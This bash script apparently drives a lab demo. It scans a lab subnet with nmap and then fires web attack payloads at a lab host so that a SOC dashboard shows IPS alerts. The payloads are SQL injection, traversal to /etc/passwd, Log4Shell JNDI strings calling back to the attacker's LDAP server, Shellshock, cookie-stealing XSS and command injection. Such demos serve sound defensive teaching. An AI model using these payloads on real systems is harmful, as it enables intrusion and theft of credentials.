#!/usr/bin/env bash
# filepath: https://github.com/rabakuku/Youtube/blob/main/Video-3-Visual-SOC-Analytics-Traffic-Dashboard/scripts/kali-attack-campaign.sh
# -----------------------------------------------------------------------------
# Visual SOC — scripted attack campaign for the on-camera demo
# Runs on: Kali Linux 192.168.40.3 (VLAN 40)   Target: SOC-Host 192.168.10.2
#
#   ./kali-attack-campaign.sh              all phases, pauses between them
#   ./kali-attack-campaign.sh --no-pause   all phases back to back
#   ./kali-attack-campaign.sh --phase 2    one phase only (1 recon, 2 scan, 3 web)
#
# LAB USE ONLY: the script refuses any target outside 192.168.10.0/24.
# Only run it against systems you own or are authorised to test.
# -----------------------------------------------------------------------------
set -euo pipefail

TARGET="${TARGET:-192.168.10.2}"
TARGET_NET="192.168.10.0/24"
URL="http://${TARGET}"
PAUSE=1
ONLY=""

R=$'\033[1;31m'; Y=$'\033[1;33m'; G=$'\033[1;32m'; C=$'\033[1;36m'; N=$'\033[0m'
banner() { printf '\n%s━━━ %s ━━━%s\n' "$R" "$*" "$N"; }
info()   { printf '%s[*]%s %s\n' "$C" "$N" "$*"; }
ok()     { printf '%s[+]%s %s\n' "$G" "$N" "$*"; }
warn()   { printf '%s[!]%s %s\n' "$Y" "$N" "$*"; }
die()    { printf '%s[x]%s %s\n' "$R" "$N" "$*" >&2; exit 1; }

while [ $# -gt 0 ]; do
    case "$1" in
        --no-pause) PAUSE=0 ;;
        --phase)    shift; ONLY="${1:-}"; [[ "$ONLY" =~ ^[123]$ ]] || die "--phase needs 1, 2 or 3" ;;
        -h|--help)  sed -n '4,12p' "$0"; exit 0 ;;
        *)          die "Unknown option: $1 (try --help)" ;;
    esac
    shift
done

# --- safety guard: lab subnet only -------------------------------------------
[[ "$TARGET" =~ ^192\.168\.10\.([0-9]{1,3})$ ]] && [ "${BASH_REMATCH[1]}" -le 254 ] \
    || die "Target ${TARGET} is outside the lab subnet ${TARGET_NET}. Refusing."

for tool in nmap curl; do
    command -v "$tool" >/dev/null 2>&1 || die "$tool not found (sudo apt install $tool)."
done
HAVE_NIKTO=0; command -v nikto >/dev/null 2>&1 && HAVE_NIKTO=1

[ "$(id -u)" -eq 0 ] || warn "Not root: nmap falls back to TCP connect scans (still logged as denies)."

pause() {
    [ "$PAUSE" -eq 1 ] || { sleep 3; return; }
    printf '\n%s[ press ENTER for the next phase — watch the wallboard ]%s ' "$Y" "$N"
    read -r _
}

run_phase() { [ -z "$ONLY" ] || [ "$ONLY" = "$1" ]; }

info "Target ${TARGET} — open ${URL} on a second screen first."

# --- Phase 1: discovery --------------------------------------------------------
if run_phase 1; then
    banner "PHASE 1 · RECON — who is alive in ${TARGET_NET}?"
    nmap -sn -n "$TARGET_NET" || true
    ok "Expect on the wallboard: THREAT LEVEL ELEVATED, ICMP/ARP probes denied by policy 3."
    [ -n "$ONLY" ] || pause
fi

# --- Phase 2: port scan ----------------------------------------------------------
if run_phase 2; then
    banner "PHASE 2 · PORT SCAN — top 1000 TCP ports on ${TARGET}"
    nmap -Pn -n -T4 --top-ports 1000 --reason "$TARGET" || true
    info "Second pass: common UDP services"
    nmap -Pn -n -sU -T4 -p 53,69,123,161,500,514,1900 "$TARGET" 2>/dev/null || true
    ok "Expect: only 80/tcp open. UNDER ATTACK, Ports Probed spikes, 'Port scan detected' alert fires."
    [ -n "$ONLY" ] || pause
fi

# --- Phase 3: web attacks on the one allowed port -------------------------------------
if run_phase 3; then
    banner "PHASE 3 · WEB ATTACKS — through the only open door (HTTP 80, IPS inspected)"
    send() { # $1 = label, rest = curl args
        local label="$1"; shift
        local code
        code="$(curl -s -o /dev/null -m 5 -w '%{http_code}' "$@" || true)"
        case "$code" in
            000) printf '  %-28s %sBLOCKED (connection reset by IPS)%s\n' "$label" "$R" "$N" ;;
            *)   printf '  %-28s HTTP %s\n' "$label" "$code" ;;
        esac
        sleep 1
    }
    send "SQL injection"         "${URL}/login?user=admin%27%20OR%20%271%27%3D%271--&pass=x"
    send "UNION SELECT"          "${URL}/api/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users--"
    send "Path traversal"        --path-as-is "${URL}/../../../../etc/passwd"
    send "Encoded traversal"     "${URL}/public/..%2f..%2f..%2f..%2fetc%2fpasswd"
    # shellcheck disable=SC2016  # literal ${jndi:...} payload, must NOT expand
    send "Log4Shell header"      -H 'X-Api-Version: ${jndi:ldap://192.168.40.3:1389/a}' "${URL}/"
    # shellcheck disable=SC2016
    send "Log4Shell user-agent"  -A '${jndi:ldap://192.168.40.3:1389/exploit}' "${URL}/"
    send "Shellshock"            -A '() { :; }; /bin/cat /etc/passwd' "${URL}/cgi-bin/status"
    send "XSS"                   "${URL}/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"
    send "Command injection"     "${URL}/ping?host=127.0.0.1%3Bcat%20/etc/passwd"
    if [ "$HAVE_NIKTO" -eq 1 ]; then
        info "Nikto web scanner (60 s cap)"
        nikto -h "$URL" -maxtime 60s -nointeractive -ask no 2>/dev/null | tail -n 15 || true
    else
        warn "nikto not installed — skipping (sudo apt install nikto)."
    fi
    ok "Expect: IPS Detections climbs, Top IPS Signatures fills, 'Web attack blocked by IPS' alert fires."
fi

banner "CAMPAIGN COMPLETE"
info "THREAT LEVEL drops back to ALL CLEAR about 60 s after the last blocked event."
